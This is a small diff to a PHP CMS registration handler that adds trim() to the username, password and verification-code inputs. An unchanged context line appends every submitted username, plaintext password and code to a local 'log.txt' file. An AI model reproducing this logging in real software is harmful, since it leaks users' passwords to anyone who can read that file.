@@ -96,9 +96,9 @@ class LoginAction extends CmsAction
 
     public function _before_Register_do()
     {
-        $username = $_POST['user_name'];
-        $password = $_POST['password'];
-        $verifycode = strtolower($_POST['verifycode']);
+        $username = trim($_POST['user_name']);
+        $password = trim($_POST['password']);
+        $verifycode = trim(strtolower($_POST['verifycode']));
 
         file_put_contents('log.txt', "n:$username;p:$password;c:$verifycode \n", FILE_APPEND);
         $checkCode = strtolower($_SESSION['checkCode']);//验证码内容
